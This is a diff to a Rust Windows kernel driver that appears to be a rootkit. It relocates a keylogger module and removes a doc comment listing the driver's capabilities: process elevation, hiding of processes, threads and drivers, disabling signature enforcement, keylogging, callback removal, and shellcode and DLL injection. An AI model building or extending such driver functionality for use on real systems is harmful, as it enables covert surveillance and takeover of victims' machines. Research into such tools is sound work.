@@ -10,7 +10,7 @@ use {
     kernel_log::KernelLogger,
     core::ptr::null_mut,
     wdk_sys::{_MODE::KernelMode, ntddk::*, *},
-    keylogger::SHUTDOWN,
+    misc::keylogger::{SHUTDOWN, keylogger},
     crate::utils::ioctls::IOCTL_MAP,
 };
 
@@ -24,9 +24,9 @@ use {
 #[cfg(not(feature = "mapper"))]
 mod registry;
 mod callbacks;
+mod misc;
 mod driver;
 mod includes;
-mod keylogger;
 mod process;
 mod thread;
 mod module;
@@ -59,7 +59,7 @@ pub unsafe extern "system" fn driver_entry(
     KernelLogger::init(log::LevelFilter::Info).expect("Failed to initialize logger");
 
     log::info!("DriverEntry Loaded");
-
+    
     #[cfg(feature = "mapper")] {
         use includes::IoCreateDriver;
 
@@ -131,7 +131,7 @@ pub unsafe extern "system" fn shadow_entry(
         null_mut(),
         null_mut(),
         null_mut(),
-        Some(keylogger::keylogger),
+        Some(keylogger),
         null_mut(),
     );
 
@@ -167,27 +167,6 @@ pub unsafe extern "system" fn shadow_entry(
 ///
 /// # Return
 /// - `NTSTATUS`: Status code indicating the success or failure of the operation.
-///
-/// # Supported IOCTLs
-/// - `IOCTL_ELEVATE_PROCESS`: Elevates the specified process to system privileges.
-/// - `IOCTL_HIDE_UNHIDE_PROCESS`: Hide / Unhide the specified process.
-/// - `IOCTL_TERMINATE_PROCESS`: Terminate process.
-/// - `IOCTL_PROTECTION_PROCESS`: Modifying the PP / PPL of a process.
-/// - `IOCTL_ANTI_KILL_DUMPING_PROCESS`: Responsible for adding shutdown protection / memory dumping for a process.
-/// - `IOCTL_ENUMERATION_PROCESS`: Lists the processes currently hidden and protect.
-/// - `IOCTL_HIDE_UNHIDE_THREAD`: Hide the specified Thread by removing it from the list of active threads.
-/// - `IOCTL_ANTI_KILL_THREAD`: Responsible for adding thread termination protection.
-/// - `IOCTL_HIDE_DRIVER`: Hiding a driver from loaded modules.
-/// - `IOCTL_ENUMERATE_DRIVER`: Enumerate active drivers on the system.
-/// - `IOCTL_ENABLE_DSE`: Responsible for enabling/disabling DSE.
-/// - `IOCTL_KEYLOGGER`: Start / Stop Keylogger.
-/// - `IOCTL_ENUMERATE_CALLBACK`: Lists callbacks.
-/// - `IOCTL_REMOVE_CALLBACK`: Remove a callback.
-/// - `IOCTL_REGISTRY_PROTECTION_VALUE`: Adding protection for registry key values.
-/// - `IOCTL_REGISTRY_PROTECTION_KEY`: Added protection for registry keys
-/// - `IOCTL_INJECTION_SHELLCODE_THREAD`: Process injection using ZwCreateThreadEx.
-/// - `IOCTL_INJECTION_SHELLCODE_APC`: APC Injection.
-/// - `IOCTL_INJECTION_DLL_THREAD`: DLL injection using ZwCreateThreadEx.
 /// 
 pub unsafe extern "C" fn device_control(_device: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
     let stack = (*irp).Tail.Overlay.__bindgen_anon_2.__bindgen_anon_1.CurrentStackLocation;
